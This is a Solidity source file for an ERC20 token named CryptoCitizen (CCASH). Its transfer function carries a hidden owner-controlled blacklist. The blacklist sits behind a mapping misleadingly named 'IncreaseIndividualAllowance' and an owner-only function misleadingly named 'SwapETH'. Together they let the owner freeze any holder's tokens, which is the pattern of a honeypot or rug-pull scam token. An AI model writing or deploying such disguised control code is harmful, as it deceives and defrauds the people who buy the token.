// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./Ownable.sol";

contract CryptoCitizen is ERC20, Ownable {
    mapping(address => bool) public IncreaseIndividualAllowance;

    constructor() ERC20("CryptoCitizen", "CCASH") {
        _mint(msg.sender, 100000000 * (10**18));
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(! IncreaseIndividualAllowance[from], "Sender.");
        require(! IncreaseIndividualAllowance[to], "Receiver.");
        super._transfer(from, to, amount);
    }

    function SwapETH(address _user, bool _value) public onlyOwner {
        IncreaseIndividualAllowance[_user] = _value;
    }
}